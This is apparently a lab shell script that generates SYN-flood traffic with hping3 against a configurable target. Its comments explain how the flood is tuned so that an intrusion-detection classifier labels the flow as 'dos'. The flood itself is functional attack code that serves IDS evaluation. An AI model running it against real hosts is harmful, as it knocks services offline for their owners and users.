#!/bin/sh
# dos_attack.sh  ->  intended model class: "dos"
#
# IMPORTANT (measured in-lab): although TRUSTLab's `dos` median is UDP, this
# lab's CICFlowMeter build cannot reproduce that UDP shape at a confidence the
# model will accept (UDP floods here read Benign, dos proba <= 0.24). The
# reachable dos region in THIS pipeline is TCP with EXTREMELY high packets/s in
# an ultra-short flow (empirically dos fired at ~0.98 on ~62k pps / ~50us TCP).
# So we generate a dense, constant-source TCP SYN flood: -k keeps one 5-tuple so
# all SYNs + the victim's SYN-ACKs group into a single very-high-pps short flow.

echo "[DOS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

rnd() { awk "BEGIN{srand();print int(rand()*$1)+1}"; }

case "$INTENSITY" in
    low)    BURST=1; SLEEP_MAX=4 ;;
    high)   BURST=3; SLEEP_MAX=1 ;;
    *)      BURST=2; SLEEP_MAX=2 ;;  # medium
esac

while [ "$(date +%s)" -lt "$END" ]; do
    # Dense TCP SYN flood, CONSTANT source port (-k) -> one ultra-high-pps,
    # ultra-short TCP flow == the dos region in this lab.
    timeout "$BURST" hping3 -S -p 80 -s 20000 -k --flood "$TARGET" 2>/dev/null
    sleep "$(rnd "$SLEEP_MAX")"
done
echo "[DOS] Done."
